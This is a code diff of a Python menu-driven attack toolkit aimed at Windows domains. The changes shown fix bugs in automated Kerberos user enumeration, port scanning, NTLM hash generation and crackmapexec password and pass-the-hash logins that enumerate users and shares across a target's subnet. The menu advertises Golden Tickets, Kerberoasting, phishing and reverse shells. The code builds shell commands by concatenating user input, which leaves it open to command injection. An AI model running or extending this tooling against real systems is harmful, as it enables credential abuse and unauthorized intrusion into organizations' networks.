@@ -172,7 +172,7 @@ def command(variable):
    return
  
 def prompt():
-   selection = input("\nPress ENTER to continue...")
+   null = input("\nPress ENTER to continue...")
    return
    
 def wipeTokens(VALD):
@@ -561,12 +561,12 @@ def options():
    print('\u2551' + "(02) Re/Set REMOTE   IP (13) Compile Exploits (24) Net View (35) Look up SecIDs (46) KerberoFilter (57) *BloodHound (68) Editor PASS (79) Hydra  SSH (90) SSH      " + '\u2551')
    print('\u2551' + "(03) Re/Set LIVE  PORTS (14) Start HTTPServer (25) Services (36) Sam Dump Users (47) KerberosBrute (58) *BH  ACLPWN (69) Editor HASH (80) Hydra  WEB (91) SSHKeyID " + '\u2551')
    print('\u2551' + "(04) Re/Set WEBSITE URL (15) Start SMB Server (26) AT  Exec (37) REGistry Hives (48) Kerberoasting (59) SecretsDump (70) Editor HOST (81) Hydra  SMB (92) Telnet   " + '\u2551')
-   print('\u2551' + "(05) Re/Set USER   NAME (16) WhoIs DNS SERVER (27) DCOMExec (38) Find EndPoints (49) Kerbero Spray (60) CrackMapExe (71) GenSSHkeyID (82) Hydra  POP (93) Netcat   " + '\u2551')
+   print('\u2551' + "(05) Re/Set USER   NAME (16) WhoIs DNS SERVER (27) DCOMExec (38) Find EndPoints (49) ASREPRoasting (60) CrackMapExe (71) GenSSHkeyID (82) Hydra  POP (93) Netcat   " + '\u2551')
    print('\u2551' + "(06) Re/Set PASS   WORD (17) Dig   DNS SERVER (28) PS  Exec (39) Enum End Point (50) PASSWORD2HASH (61) PSExec HASH (72) GenListUser (83) Hydra  TOM (94) SQSH     " + '\u2551')
-   print('\u2551' + "(07) Re/Set NTLM   HASH (18) Recon DNS SERVER (29) SMB Exec (40) RpcClient Serv (51) HASHs Sprayer (62) SmbExecHASH (73) GenListPass (84) MSF TOMCAT (95) MSSQL    " + '\u2551')
+   print('\u2551' + "(07) Re/Set NTLM   HASH (18) Recon DNS SERVER (29) SMB Exec (40) RpcClient Serv (51) HASHS Sprayer (62) SmbExecHASH (73) GenListPass (84) MSF TOMCAT (95) MSSQL    " + '\u2551')
    print('\u2551' + "(08) Re/Set TICKET NAME (19) Dump  DNS SERVER (30) WMI Exec (41) SmbClient Serv (52) Pass the HASH (63) WmiExecHASH (74) GenPhishCod (85) MSF RSHELL (96) MySQL    " + '\u2551')
    print('\u2551' + "(09) Re/Set DOMAIN NAME (20) Nmap Live  PORTS (31)          (42) Smb Map SHARES (53) Silver Ticket (64) Remote Sync (75) AutoPhisher (86) Evil WinRm (97)          " + '\u2551')
-   print('\u2551' + "(10) Re/Set DOMAIN  SID (21) Nmap PORTService (32)          (43) Smb Dump Files (54) Golden Ticket (65) RSync Dumps (76) Dir Searchs (87) RemDesktop (98)          " + '\u2551')
+   print('\u2551' + "(10) Re/Set DOMAIN  SID (21) Nmap PORTService (32)          (43) Smb Dump Files (54) Golden Ticket (65) RSync Dumps (76) DIR Searchs (87) RemDesktop (98)          " + '\u2551')
    print('\u2551' + "(11) Re/Set SHARE  NAME (22) Nmap Sub DOMAINS (33)          (44) SmbMount SHARE (55) Golden DC PAC (66) NTDSDECRYPT (77) Nikto Scans (88) FreeRDPX11 (99) Exit     " + '\u2551')
    print('\u255A' + ('\u2550')*163 + '\u255D')
    return
@@ -885,10 +885,11 @@ while True:
                         if USER[x][:5] != "Error":
                            USER[x] = spacePadding(USER[x], COL3)
                            HASH[x] = ""
-                           HASH[x] = dotPadding(HASH[x], COL4)                           
-                           write1.write(USER[x].rstrip(" ") + "\n")
-                           write2.write(HASH[x].rstrip(" ") + "\n")                                                         
-                           print(colored(USER[x],colour6))
+                           HASH[x] = dotPadding(HASH[x], COL4)
+                           if USER[x][:1] != " ":
+                              write1.write(USER[x].rstrip(" ") + "\n")
+                              write2.write(HASH[x].rstrip(" ") + "\n")                                                         
+                              print(colored(USER[x],colour6))
                else:
                   print("[+] Unable to enumerate domain users...")         
       prompt()
@@ -1353,7 +1354,7 @@ while True:
       checkParams = testOne()      
       
       if checkParams != 1:
-            print("[*] Attempting to enumerate live ports, please wait as this may take sometime...")
+            print("[*] Attempting to enumerate live ports, please wait as this can take sometime...")
             command("ports=$(nmap " + IP46 + " -p- --min-rate=1000 -T4 " + TIP.rstrip(" ") + " | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//); echo $ports > PORTS.tmp")
             PTS = linecache.getline("PORTS.tmp", 1).rstrip("\n")
             POR = spacePadding(PTS, COL1)
@@ -1379,7 +1380,7 @@ while True:
       if checkParams != 1:
          if POR[:5] != "EMPTY":
             print("[*] Scanning specified live ports only, please wait...")
-            command("nmap " + IP46 + " -p " + POR.rstrip(" ") + " -sC -sV " + TIP.rstrip(" "))
+            command("nmap " + IP46 + " -p " + PTS + " -sC -sV " + TIP.rstrip(" "))
          else:
             print("[*] Fast scanning all ports, please wait...")
             command("nmap " + IP46 + " -T4 -F " + TIP.rstrip(" "))
@@ -2001,17 +2002,18 @@ while True:
       
       if checkParams != 1:
          print("[*] Enumerating remote server, please wait...")
-         command("nmap " + IP46 + " -p 88 --script=krb5-enum-users --script-args=krb5-enum-users.realm=\'" + DOM.rstrip(" ") + ", userdb=" + dataDir + "/usernames.txt\' " + TIP.rstrip(" ") + " >> users.tmp")         
-         command("sed -i '/@/!d' users.tmp")
+         command("nmap " + IP46 + " -p 88 --script=krb5-enum-users --script-args=krb5-enum-users.realm=\'" + DOM.rstrip(" ") + ", userdb=" + dataDir + "/usernames.txt\' " + TIP.rstrip(" ") + " >> users.tmp")
+
+         command("sed -i '/@/!d' users.tmp")							# PARSE FILE 1
          command("sort -r users.tmp > sortedusers.tmp")        
           
-         with open("sortedusers.tmp", "r") as read, open("validusers.tmp", "w") as parse:
+         with open("sortedusers.tmp", "r") as read, open("validusers.tmp", "w") as parse:	# PARSE FILE 2
             for username in read:
                username = username.replace("|     ","")
                username = username.replace("|_    ","")
                username, null = username.split("@")
                if username != "":
-                  parse.write(username + "\n")           
+                  parse.write(username + "\n")                             
                          
          count = len(open('validusers.tmp').readlines())   
                  
@@ -2032,11 +2034,10 @@ while True:
                         
             with open(dataDir + "/usernames.txt", "w") as write1, open(dataDir + "/hashes.txt", "w") as write2, open(dataDir + "/tokens.txt", "w") as write3:
                for x in range(0, maxUser):
-                  if USER[x] != "":
+                  if USER[x][:1] != " ":
                      write1.write(USER[x].rstrip(" ") + "\n")
                      write2.write(HASH[x].rstrip(" ") + "\n")
-                     write3.write(VALD[x].rstrip(" ") + "\n")
-                     
+                     write3.write(VALD[x].rstrip(" ") + "\n")                     
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -2159,7 +2160,11 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '50':
-      if PAS[:2] != "''":
+      if PAS[:2] == "''":
+         print("[-] Password has not been specified...")
+         checkParams = 1
+
+      if checkParams != 1:    
          NTM = hashlib.new("md4", PAS.rstrip(" ").encode("utf-16le")).digest()
          NTM = binascii.hexlify(NTM)
          NTM = str(NTM)
@@ -2169,11 +2174,9 @@ while True:
          for x in range(0, maxUser):
             if USER[x].rstrip(" ") == USR.rstrip(" "):
                HASH[x] = NTM.rstrip(" ")
+
+         print("[+] Created hash value " + NTM + "...")
          NTM = spacePadding(NTM, COL1)
-         wipeTokens(VALD)
-      else:
-         print("[-] Password has not been specified...")
-         
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -2462,9 +2465,10 @@ while True:
                USER[x] = get1[:COL3]
                HASH[x] = get4[:COL4]
                USER[x] = spacePadding(USER[x], COL3)
-               HASH[x] = spacePadding(HASH[x], COL4)                           
-               command("echo " + USER[x].rstrip(" ") + " >> " + dataDir + "/usernames.txt")
-               command("echo " + HASH[x].rstrip(" ") + " >> " + dataDir + "/hashes.txt")           
+               HASH[x] = spacePadding(HASH[x], COL4)
+               if USER[x][:1] != " ":
+                  command("echo " + USER[x].rstrip(" ") + " >> " + dataDir + "/usernames.txt")
+                  command("echo " + HASH[x].rstrip(" ") + " >> " + dataDir + "/hashes.txt")           
          else:      
             print("[+] No users were found. check the domain name is correct...")               
       prompt()
@@ -2480,36 +2484,38 @@ while True:
    if selection =='60':
       checkParams = testTwo()
       
-      if checkParams != 1:
-         print("[*] Enumerating, please wait...")     
-                
-         if PAS[:2] != "''":         
-            print("[+] Finding exploitable machines on the same subnet...\n")            
-            command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")                     
-           
-            print("\n[+] Trying specified windows command...\n")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -x whoami")
-           
-            print("\n[+] Trying to enumerate users and shares...\n")  
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --users")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --shares")
-         else:
-            if NTM[:1] != " ":
-               print("[i] Using HASH value as password credential")
-               print("[+] Finding exploitable machines on the same subnet...\n")
-               command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")         
-           
-               print("\n[+] Trying specified windows command...\n")
-               command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " -x 'whoami /all'")
-           
-               print("\n[+] Trying to enumerate users and shares...\n")  
-               command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --users")
-               command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --shares")
-            else:
-               print("[-] Both Password and Hash value have not been specified...")
-               
-      prompt()
+      if (PAS[:2] == "''") and (NTM[:5] == "EMPTY"):
+         print("[-] Both Password and Hash value have not been specified...")
+         checkParams = 1
+      
+      if (checkParams != 1) and (PAS[:2] != "''"):
+         if "5985" in PTS:
+            print("[+] Finding exploitable machines on the same subnet...\n")
+            command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
+            
+         if "445" in PTS:
+            print("\n[+] Enumerating users...\n")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --users --jitter 5")      
+            print("\n[+] Enumerating shares...\n")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --shares --jitter 5")
+            checkParams = 1
 
+      if checkParams != 1:
+         print("[i] Using HASH value as password credential...")  
+         
+         if "5985" in PTS:
+            print("[+] Finding exploitable machines on the same subnet...\n")
+            command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
+         
+         if "445" in PTS:
+            print("\n[+] Enumerating users...\n")
+            command("crackmapexec  smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --users")
+            print("\n[+] Enumerating shares...\n")
+            command("crackmapexec  smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --shares")
+      
+      exit(1)	# FOR SOME REASON GET EOF ERROR HERE ???   
+      prompt()
+   
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
